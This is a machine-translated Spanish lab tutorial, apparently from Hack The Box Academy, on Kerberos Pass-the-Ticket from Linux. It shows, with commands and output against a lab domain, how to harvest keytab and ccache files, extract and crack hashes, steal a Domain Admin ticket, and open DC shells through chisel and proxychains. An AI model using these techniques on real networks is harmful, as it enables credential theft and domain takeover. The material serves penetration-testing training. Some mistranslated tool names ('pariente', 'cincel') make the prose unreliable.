# Pase el boleto (PTT) de Linux

Aunque no son comunes, las computadoras de Linux pueden conectarse a Active Directory para proporcionar una gestión de identidad centralizada e integrarse con los sistemas de la organización, lo que brinda a los usuarios la capacidad de tener una sola identidad para autenticarse en las computadoras Linux y Windows.

Una computadora Linux conectada a Active Directory usa comúnmente a Kerberos como autenticación. Supongamos que este es el caso, y logramos comprometer una máquina Linux conectada a Active Directory. En ese caso, podríamos tratar de encontrar boletos de Kerberos para hacerse pasar por otros usuarios y obtener más acceso a la red.

Un sistema Linux se puede configurar de varias maneras para almacenar boletos Kerberos. Discutiremos algunas opciones de almacenamiento diferentes en esta sección.

**Nota:**Una máquina Linux no conectada a Active Directory podría usar boletos Kerberos en scripts o para autenticarse en la red. No es un requisito unirse al dominio para usar boletos Kerberos desde una máquina Linux.

---

# **Kerberos en Linux**

Windows y Linux usan el mismo proceso para solicitar un boleto de concesión de ticket (TGT) y boleto de servicio (TGS). Sin embargo, la forma en que almacenan la información del boleto puede variar según la distribución e implementación de Linux.

En la mayoría de los casos, las máquinas Linux almacenan boletos Kerberos como[archivos ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html)en el`/tmp`directorio. Por defecto, la ubicación del boleto Kerberos se almacena en la variable de entorno`KRB5CCNAME`. Esta variable puede identificar si se están utilizando boletos Kerberos o si se cambia la ubicación predeterminada para almacenar boletos Kerberos. Estos[archivos ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html)están protegidos por permisos de lectura y escritura, pero un usuario con privilegios elevados o privilegios raíz podría acceder fácilmente a estos boletos.

Otro uso diario de Kerberos en Linux es con[keytab](https://kb.iu.edu/d/aumh)archivos. A[keytab](https://kb.iu.edu/d/aumh)es un archivo que contiene pares de principios de Kerberos y claves cifradas (que se derivan de la contraseña de Kerberos). Puede usar un archivo KeyTab para autenticar en varios sistemas remotos utilizando Kerberos sin ingresar una contraseña. Sin embargo, cuando cambia su contraseña, debe recrear todos sus archivos KeyTab.

[Keytab](https://kb.iu.edu/d/aumh)Los archivos comúnmente permiten que los scripts se autenticen automáticamente usando Kerberos sin requerir la interacción humana o el acceso a una contraseña almacenada en un archivo de texto sin formato. Por ejemplo, un script puede usar un archivo KeyTab para acceder a archivos almacenados en la carpeta Windows Share.

**Nota:**Cualquier computadora que tenga un cliente Kerberos instalado puede crear archivos KeyTab. Los archivos KeyTab se pueden crear en una computadora y copiarse para su uso en otras computadoras porque no están restringidos a los sistemas en los que se crearon inicialmente.

---

# **Guión**

Para practicar y comprender cómo podemos abusar de Kerberos de un sistema de Linux, tenemos una computadora (`LINUX01`) conectado al controlador de dominio. Esta máquina solo es accesible a través de`MS01`. Para acceder a esta máquina a través de SSH, podemos conectarnos a`MS01`a través de RDP y, desde allí, conéctese a la máquina Linux usando SSH desde la línea de comando de Windows. Otra opción es usar un puerto hacia adelante. Si no sabe cómo hacerlo, puede leer el módulo[Pivote, túneles y reenvío de puertos](https://academy.hackthebox.com/module/details/158).

### **Auth Linux de la imagen MS01**

![](https://academy.hackthebox.com/storage/modules/147/linux-auth-from-ms01.jpg)

Como alternativa, creamos un puerto hacia adelante para simplificar la interacción con`LINUX01`. Conectándose al puerto TCP/2222 en`MS01`, obtendremos acceso al puerto TCP/22 en`LINUX01`.

Supongamos que estamos en una nueva evaluación, y la compañía nos da acceso a`LINUX01`y el usuario`david@inlanefreight.htb`y contraseña`Password2`.

### **Auth Linux a través del puerto delantero**

Pase el boleto (PTT) de Linux

```
xnoxos@htb[/htb]$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222david@inlanefreight.htb@10.129.204.23's password:
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 11 Oct 2022 09:30:58 AM UTC

  System load:  0.09               Processes:               227
  Usage of /:   38.1% of 13.70GB   Users logged in:         2
  Memory usage: 32%                IPv4 address for ens160: 172.16.1.15
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

12 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

New release '22.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Tue Oct 11 09:30:46 2022 from 172.16.1.5
david@inlanefreight.htb@linux01:~$
```

---

# **Identificar la integración de Linux e Active Directory**

Podemos identificar si la máquina Linux está unida al dominio[reino](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd), una herramienta utilizada para administrar la inscripción del sistema en un dominio y establecer qué usuarios o grupos de dominio pueden acceder a los recursos del sistema local.

### **Reino: verifique si Linux Machine está unido al dominio**

Pase el boleto (PTT) de Linux

```
david@inlanefreight.htb@linux01:~$ realm listinlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins

```

La salida del comando indica que la máquina está configurada como miembro de Kerberos. También nos brinda información sobre el nombre de dominio (inlaneFreight.htb) y qué usuarios y grupos pueden iniciar sesión, que en este caso son los usuarios David y Julio y los administradores del grupo Linux.

En caso[reino](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd)no está disponible, también podemos buscar otras herramientas utilizadas para integrar Linux con Active Directory como[SSSD](https://sssd.io/)o[acariciar](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html). Buscar esos servicios que se ejecutan en la máquina es otra forma de identificar si está unido al dominio. Podemos leer esto[blog](https://web.archive.org/web/20210624040251/https://www.2daygeek.com/how-to-identify-that-the-linux-server-is-integrated-with-active-directory-ad/)Para más detalles. Busquemos esos servicios para confirmar si la máquina está unida al dominio.

### **PD - Verifique si Linux Machine está unido al dominio**

Pase el boleto (PTT) de Linux

```
david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"root        2140       1  0 Sep29 ?        00:00:01 /usr/sbin/sssd -i --logger=files
root        2141    2140  0 Sep29 ?        00:00:08 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb --uid 0 --gid 0 --logger=files
root        2142    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
root        2143    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files

```

---

# **Encontrar boletos de Kerberos en Linux**

Como atacante, siempre estamos buscando credenciales. En el dominio de Linux unidos a las máquinas, queremos encontrar boletos de Kerberos para obtener más acceso. Los boletos de Kerberos se pueden encontrar en diferentes lugares dependiendo de la implementación de Linux o que el administrador cambie la configuración predeterminada. Exploremos algunas formas comunes de encontrar boletos de Kerberos.

---

# **Encontrar archivos KeyTab**

Un enfoque directo es usar`find`Para buscar archivos cuyo nombre contiene la palabra`keytab`. Cuando un administrador comúnmente crea un boleto de Kerberos para ser utilizado con un script, establece la extensión a`.keytab`. Aunque no es obligatorio, es una forma en que los administradores comúnmente se refieren a un archivo KeyTab.

### **Uso de Find para buscar archivos con KeyTab en el nombre**

Pase el boleto (PTT) de Linux

```
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls2>/dev/null<SNIP>

   131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab
   262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab

```

**Nota:**Para usar un archivo KeyTab, debemos haber leído y escritura (RW) privilegios en el archivo.

Otra forma de encontrar`keytab`Los archivos se encuentran en scripts automatizados configurados utilizando un CronJob o cualquier otro servicio de Linux. Si un administrador necesita ejecutar un script para interactuar con un servicio de Windows que usa kerberos, y si el archivo keyTab no tiene el`.keytab`Extensión, podemos encontrar el nombre de archivo apropiado dentro del script. Veamos este ejemplo:

### **Identificación de archivos KeyTab en Cronjobs**

Pase el boleto (PTT) de Linux

```
carlos@inlanefreight.htb@linux01:~$ crontab -l# Edit this file to introduce tasks to be run by cron.# <SNIP>
## m h  dom mon dow   command*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh#!/bin/bashkinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt

```

En el script anterior, notamos el uso de[pariente](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html), lo que significa que Kerberos está en uso.[pariente](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html)Permite la interacción con Kerberos, y su función es solicitar el TGT del usuario y almacenar este ticket en el caché (archivo CCACHE). Podemos usar`kinit`para importar un`keytab`en nuestra sesión y actúa como usuario.

En este ejemplo, encontramos un script que importa un boleto de Kerberos (`svc_workstations.kt`) para el usuario`svc_workstations@INLANEFREIGHT.HTB`antes de intentar conectarse a una carpeta compartida. Más tarde discutiremos cómo usar esos boletos y hacer pasar por los usuarios.

**Nota:**Como discutimos en la sección Pase el ticket desde la sección de Windows, una cuenta de computadora necesita un boleto para interactuar con el entorno de Active Directory. Del mismo modo, una máquina unida a un dominio de Linux necesita un boleto. El boleto se representa como un archivo keyTab ubicado de forma predeterminada en`/etc/krb5.keytab`y solo puede ser leído por el usuario raíz. Si obtenemos acceso a este boleto, podemos hacerse pasar por la cuenta de la computadora Linux01 $ .inlaneFreight.htb

---

# **Encontrar archivos CCACHE**

Un caché de credencial o[ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html)Archivo contiene las credenciales de Kerberos mientras permanecen válidos y, en general, mientras dura la sesión del usuario. Una vez que un usuario se autentica en el dominio, se crea un archivo CCACHE que almacena la información del boleto. La ruta a este archivo se coloca en el`KRB5CCNAME`Variable de entorno. Esta variable es utilizada por herramientas que admiten la autenticación de Kerberos para encontrar los datos de Kerberos. Buscemos las variables de entorno e identifiquemos la ubicación de nuestro caché de credenciales de Kerberos:

### **Revisión de las variables de entorno para archivos CCACHE.**

Pase el boleto (PTT) de Linux

```
david@inlanefreight.htb@linux01:~$ env | grep -i krb5KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh

```

Como se mencionó anteriormente,`ccache`Los archivos se encuentran, de forma predeterminada, en`/tmp`. Podemos buscar usuarios que hayan iniciado sesión en la computadora, y si obtenemos acceso como un usuario root o privilegiado, podríamos hacerse pasar por un usuario utilizando su`ccache`archivo mientras aún es válido.

### **Buscando archivos ccache en /tmp**

Pase el boleto (PTT) de Linux

```
david@inlanefreight.htb@linux01:~$ ls -la /tmptotal 68
drwxrwxrwt 13 root                     root                           4096 Oct  6 16:38 .
drwxr-xr-x 20 root                     root                           4096 Oct  6  2021 ..
-rw-------  1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau
-rw-------  1 david@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d
-rw-------  1 carlos@inlanefreight.htb domain users@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh

```

---

# **Abusar de archivos keytab**

Como atacantes, podemos tener varios usos para un archivo KeyTab. Lo primero que podemos hacer es hacerse pasar por un usuario usando`kinit`. Para usar un archivo KeyTab, necesitamos saber para qué usuario se creó.`klist`es otra aplicación utilizada para interactuar con Kerberos en Linux. Esta aplicación lee información de un`keytab`archivo. Veamos eso con el siguiente comando:

### **Listado de información del archivo de KeyTab**

Pase el boleto (PTT) de Linux

```
david@inlanefreight.htb@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB

```

El boleto corresponde al usuario Carlos. Ahora podemos hacerse pasar por el usuario con`kinit`. Confirmemos con qué boleto estamos usando`klist`Y luego importe el boleto de Carlos en nuestra sesión con`kinit`.

**Nota:** **pariente**es sensible al caso, así que asegúrese de usar el nombre del principal como se muestra en Klist. En este caso, el nombre de usuario es minúscula, y el nombre de dominio es mayúscula.

### **Hacerse pasar por un usuario con un keytab**

Pase el boleto (PTT) de Linux

```
david@inlanefreight.htb@linux01:~$ klist Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:02:11
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytabdavid@inlanefreight.htb@linux01:~$ klist Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:16:11

```

Podemos intentar acceder a la carpeta compartida`\\dc01\carlos`Para confirmar nuestro acceso.

### **Conectarse a SMB Share como Carlos**

Pase el boleto (PTT) de Linux

```
david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls  .                                   D        0  Thu Oct  6 14:46:26 2022
  ..                                  D        0  Thu Oct  6 14:46:26 2022
  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022

                7706623 blocks of size 4096. 4452852 blocks available

```

**Nota:**Para mantener el boleto de la sesión actual, antes de importar el keyTab, guarde una copia del archivo ccache presente en la variable de entorno`KRB5CCNAME`.

### **Extracto de keytab**

El segundo método que utilizaremos para abusar de Kerberos en Linux es extraer los secretos de un archivo KeyTab. Pudimos hacerse pasar por Carlos usando los boletos de la cuenta para leer una carpeta compartida en el dominio, pero si queremos acceder a su cuenta en la máquina Linux, necesitaremos su contraseña.

Podemos intentar descifrar la contraseña de la cuenta extrayendo los hashes del archivo KeyTab. Usemos[KeytabExtract](https://github.com/sosdave/KeyTabExtract), una herramienta para extraer información valiosa de los archivos .KeyTab de tipo 502, que puede usarse para autenticar las cajas de Linux a Kerberos. El script extraerá información como el reino, el principal de servicio, el tipo de cifrado y los hashes.

### **Extracción de hashes keytab con keyTabExtract**

Pase el boleto (PTT) de Linux

```
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4

```

Con el hash NTLM, podemos realizar un pase del ataque hash. Con el hash AES256 o AES128, podemos forjar nuestros boletos usando Rubeus o intentar descifrar los hash para obtener la contraseña de texto sin formato.

**Nota:**Un archivo de KeyTab puede contener diferentes tipos de hash y se puede fusionar para contener múltiples credenciales incluso de diferentes usuarios.

El hash más sencillo para romper es el hash NTLM. Podemos usar herramientas como[Hashcat](https://hashcat.net/)o[John the Ripper](https://www.openwall.com/john/)para romperlo. Sin embargo, una forma rápida de descifrar las contraseñas es con repositorios en línea como[https://crackstation.net/](https://crackstation.net/), que contiene miles de millones de contraseñas.

![](https://academy.hackthebox.com/storage/modules/147/crackstation.jpg)

Como podemos ver en la imagen, la contraseña para el usuario Carlos es`Password5`. Ahora podemos iniciar sesión como Carlos.

### **Inicie sesión como Carlos**

Pase el boleto (PTT) de Linux

```
david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htbPassword:
carlos@inlanefreight.htb@linux01:~$ klist Ticket cache: FILE:/tmp/krb5cc_647402606_ZX6KFA
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 11:01:13  10/07/2022 21:01:13  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 11:01:13

```

### **Obteniendo más hashes**

Carlos tiene un Cronjob que usa un archivo KeyTab llamado`svc_workstations.kt`. Podemos repetir el proceso, descifrar la contraseña e iniciar sesión como`svc_workstations`.

---

# **Abusar de Keytab ccache**

Para abusar de un archivo CCACHE, todo lo que necesitamos es leer privilegios en el archivo. Estos archivos, ubicados en`/tmp`, solo puede ser leído por el usuario que los creó, pero si obtenemos acceso a la raíz, podríamos usarlos.

Una vez que iniciamos sesión con las credenciales para el usuario`svc_workstations`, podemos usar`sudo -l`y confirme que el usuario puede ejecutar cualquier comando como root. Podemos usar el`sudo su`comandar para cambiar el usuario a root.

### **Escalada de privilegio a la raíz**

Pase el boleto (PTT) de Linux

```
xnoxos@htb[/htb]$ ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
svc_workstations@inlanefreight.htb@10.129.204.23's password:
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)
...SNIP...

svc_workstations@inlanefreight.htb@linux01:~$ sudo -l[sudo] password for svc_workstations@inlanefreight.htb:
Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_workstations@inlanefreight.htb may run the following commands on linux01:
    (ALL) ALL
svc_workstations@inlanefreight.htb@linux01:~$ sudo suroot@linux01:/home/svc_workstations@inlanefreight.htb# whoamiroot

```

Como root, necesitamos identificar qué boletos están presentes en la máquina, a quien pertenecen y su tiempo de vencimiento.

### **Buscando archivos ccache**

Pase el boleto (PTT) de Linux

```
root@linux01:~# ls -la /tmptotal 76
drwxrwxrwt 13 root                               root                           4096 Oct  7 11:35 .
drwxr-xr-x 20 root                               root                           4096 Oct  6  2021 ..
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_HRJDux
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_qMKxc6
-rw-------  1 david@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 10:43 krb5cc_647401107_O0oUWh
-rw-------  1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1535 Oct  7 11:21 krb5cc_647401109_D7gVZF
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 3175 Oct  7 11:35 krb5cc_647402606
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1433 Oct  7 11:01 krb5cc_647402606_ZX6KFA

```

Hay un usuario (julio@inlanefreight.htb) a quien aún no hemos obtenido acceso. Podemos confirmar los grupos a los que pertenece usando`id`.

### **Identificar la membresía del grupo con el comando de identificación**

Pase el boleto (PTT) de Linux

```
root@linux01:~# id julio@inlanefreight.htbuid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)

```

Julio es miembro de la`Domain Admins`grupo. Podemos intentar hacerse pasar por el usuario y obtener acceso al`DC01`Host del controlador de dominio.

Para usar un archivo ccache, podemos copiar el archivo ccache y asignar la ruta del archivo a la`KRB5CCNAME`variable.

### **Importar el archivo CCACHE en nuestra sesión actual**

Pase el boleto (PTT) de Linux

```
root@linux01:~# klistklist: No credentials cache found (filename: /tmp/krb5cc_0)
root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133root@linux01:~# klistTicket cache: FILE:/root/krb5cc_647401106_I8I133
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 13:25:01
root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass$Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2021  Config.Msi                        DHS        0  Wed Oct  6 14:26:27 2021
  Documents and Settings          DHSrn        0  Wed Oct  6 20:38:04 2021
  john                                D        0  Mon Jul 18 13:19:50 2022
  julio                               D        0  Mon Jul 18 13:54:02 2022
  pagefile.sys                      AHS 738197504  Thu Oct  6 21:32:44 2022
  PerfLogs                            D        0  Fri Feb 25 16:20:48 2022
  Program Files                      DR        0  Wed Oct  6 20:50:50 2021
  Program Files (x86)                 D        0  Mon Jul 18 16:00:35 2022
  ProgramData                       DHn        0  Fri Aug 19 12:18:42 2022
  SharedFolder                        D        0  Thu Oct  6 14:46:20 2022
  System Volume Information         DHS        0  Wed Jul 13 19:01:52 2022
  tools                               D        0  Thu Sep 22 18:19:04 2022
  Users                              DR        0  Thu Oct  6 11:46:05 2022
  Windows                             D        0  Wed Oct  5 13:20:00 2022

                7706623 blocks of size 4096. 4447612 blocks available

```

**Nota:**Klist muestra la información del boleto. Debemos considerar los valores de "inicio válido" y "expira". Si la fecha de vencimiento ha pasado, el boleto no funcionará.`ccache files`son temporales. Pueden cambiar o expirar si el usuario ya no los usa o durante las operaciones de inicio de sesión y de inicio de sesión.

---

# **Uso de herramientas de ataque de Linux con Kerberos**

La mayoría de las herramientas de ataque de Linux que interactúan con Windows y Active Directory admiten la autenticación Kerberos. Si los usamos desde una máquina unida por dominio, debemos asegurarnos de nuestro`KRB5CCNAME`El entorno variable está configurado en el archivo ccache que queremos usar. En caso de que estemos atacando desde una máquina que no es miembro del dominio, por ejemplo, nuestro host de ataque, debemos asegurarnos de que nuestra máquina pueda contactar al KDC o al controlador de dominio, y esa resolución de nombres de dominio está funcionando.

En este escenario, nuestro host de ataque no tiene conexión con el`KDC/Domain Controller`, y no podemos usar el controlador de dominio para la resolución de nombres. Para usar Kerberos, necesitamos representar nuestro tráfico a través de`MS01`con una herramienta como[Cincel](https://github.com/jpillora/chisel)y[Proxychains](https://github.com/haad/proxychains)y editar el`/etc/hosts`Archivo a las direcciones IP de código duro del dominio y las máquinas que queremos atacar.

### **Archivo de host modificado**

Pase el boleto (PTT) de Linux

```
xnoxos@htb[/htb]$ cat /etc/hosts# Host addresses172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
172.16.1.5  ms01.inlanefreight.htb  ms01

```

Necesitamos modificar nuestro archivo de configuración ProxyChains para usar SOCKS5 y Puerto 1080.

### **Archivo de configuración proxychains**

Pase el boleto (PTT) de Linux

```
xnoxos@htb[/htb]$ cat /etc/proxychains.conf<SNIP>

[ProxyList]
socks5 127.0.0.1 1080

```

Debemos descargar y ejecutar[cincel](https://github.com/jpillora/chisel)en nuestro anfitrión de ataque.

### **Descargar cisel a nuestro host de ataque**

Pase el boleto (PTT) de Linux

```
xnoxos@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gzxnoxos@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gzxnoxos@htb[/htb]$ mv chisel_* chisel && chmod +x ./chiselxnoxos@htb[/htb]$ sudo ./chisel server --reverse 2022/10/10 07:26:15 server: Reverse tunneling enabled
2022/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
2022/10/10 07:26:15 server: Listening on http://0.0.0.0:8080

```

Conectarse`MS01`a través de RDP y ejecutar cincel (ubicado en c: \ herramientas).

### **Conéctese a MS01 con xfreerdp**

Pase el boleto (PTT) de Linux

```
xnoxos@htb[/htb]$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```

### **Ejecutar cincel desde ms01**

Pase el boleto (PTT) de Linux

```
C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks

2022/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
2022/10/10 06:34:20 client: Connected (Latency 125.6177ms)

```

**Nota:**La IP del cliente es su IP de host de ataque.

Finalmente, necesitamos transferir el archivo ccache de Julio desde`LINUX01`y crear la variable de entorno`KRB5CCNAME`con el valor correspondiente a la ruta del archivo ccache.

### **Configuración de la variable de entorno KRB5CCName**

Pase el boleto (PTT) de Linux

```
xnoxos@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```

**Nota:**Si no está familiarizado con las operaciones de transferencia de archivos, consulte el módulo[Transferencias de archivos](https://academy.hackthebox.com/module/details/24).

### **Embalsar**

Para usar el boleto Kerberos, necesitamos especificar el nombre de nuestra máquina de destino (no la dirección IP) y usar la opción`-k`. Si recibimos un mensaje para una contraseña, también podemos incluir la opción`-no-pass`.

### **Uso de Impacket con proxychains y autenticación de Kerberos**

Pase el boleto (PTT) de Linux

```
xnoxos@htb[/htb]$ proxychains impacket-wmiexec dc01 -k[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[*] SMBv3.0 dialect used
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:50713  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
inlanefreight\julio

```

**Nota:**Si está utilizando herramientas de Impacket desde una máquina Linux conectada al dominio, tenga en cuenta que algunas implementaciones de Linux Active Directory usan el archivo: prefijo en la variable KRB5CCNAME. Si este es el caso, necesitamos modificar la variable solo para incluir la ruta al archivo CCACHE.

### **Evil-Winrm**

Para usar[Evil-Winrm](https://github.com/Hackplayers/evil-winrm)Con Kerberos, necesitamos instalar el paquete Kerberos utilizado para la autenticación de la red. Para algunos Linux como Debian (Parrot, Kali, etc.), se llama`krb5-user`. Mientras se instala, obtendremos un mensaje para el reino de Kerberos. Use el nombre de dominio:`INLANEFREIGHT.HTB`, y el KDC es el`DC01`.

### **Instalación del paquete de autenticación de Kerberos**

Pase el boleto (PTT) de Linux

```
xnoxos@htb[/htb]$ sudo apt-get install krb5-user -yReading package lists... Done
Building dependency tree... Done
Reading state information... Done

<SNIP>

```

### **Reino de Versión 5 de Kerberos predeterminado**

![](https://academy.hackthebox.com/storage/modules/147/kerberos-realm.jpg)

Los servidores Kerberos pueden estar vacíos.

### **Servidor administrativo para su reino de Kerberos**

![](https://academy.hackthebox.com/storage/modules/147/kerberos-server-dc01.jpg)

En caso de que el paquete`krb5-user`ya está instalado, necesitamos cambiar el archivo de configuración`/etc/krb5.conf`Para incluir los siguientes valores:

### **Archivo de configuración de Kerberos para inlanefreight.htb**

Pase el boleto (PTT) de Linux

```
xnoxos@htb[/htb]$ cat /etc/krb5.conf[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

<SNIP>

```

Ahora podemos usar Evil-Winrm.

### **Usando Evil-Winrm con Kerberos**

Pase el boleto (PTT) de Linux

```
xnoxos@htb[/htb]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14

Evil-WinRM shell v3.3

Warning: Remote path completions are disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:5985  ...  OK
*Evil-WinRM* PS C:\Users\julio\Documents> whoami ; hostname
inlanefreight\julio
DC01

```

---

# **Misceláneas**

Si queremos usar un`ccache file`en Windows o en un`kirbi file`En una máquina de Linux, podemos usar[consumo](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py)para convertirlos. Para usarlo, especificamos el archivo que queremos convertir y el nombre de archivo de salida. Convirtamos el archivo CCACHE de Julio en Kirbi.

### **Convertidor de boletos de impense**

Pase el boleto (PTT) de Linux

```
xnoxos@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbiImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] converting ccache to kirbi...
[+] done

```

Podemos hacer la operación inversa seleccionando primero un`.kirbi file`. Usemos el`.kirbi`Archivo en Windows.

